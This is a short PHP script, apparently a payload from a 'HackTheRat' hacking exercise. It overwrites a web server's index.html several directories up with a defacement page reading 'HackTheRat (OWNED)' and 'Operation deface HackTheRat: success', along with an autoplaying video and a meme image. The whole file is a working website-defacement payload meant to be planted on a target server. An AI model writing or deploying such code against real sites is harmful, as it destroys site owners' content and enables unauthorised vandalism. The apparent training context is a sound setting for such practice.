<?php

$newindex = fopen("../../../index.html", "w");

$newcontent = "<html><head><title>HackTheRat (OWNED)</title>";
$newcontent .= "<style>@import url(\"https://fonts.googleapis.com/css?family=Black+Ops+One\"); h1 { font-family: 'Black Ops One'; } body { background-color: #dbd3c5; } </style></head>\n";
$newcontent .= "<body><div style='text-align: center'><h1>Operation deface HackTheRat: <span style='color: green'>success</span></h1>\n";
$newcontent .= '<iframe style="margin-bottom: 38px" width="560" height="315" src="https://www.youtube.com/embed/KaqC5FnvAEc?autoplay=1" frameborder="0" allow="autoplay; encrypted-media;" allowfullscreen></iframe><br>';
$newcontent .= "<img width='703' height='450' src=\"http://hacktherat.csec.chatzi.org/courses/TMA101/page/memeHD.jpg\"/>";
$newcontent .= "</div></body></html>";

fwrite($newindex, $newcontent);
fclose($newindex);

?>
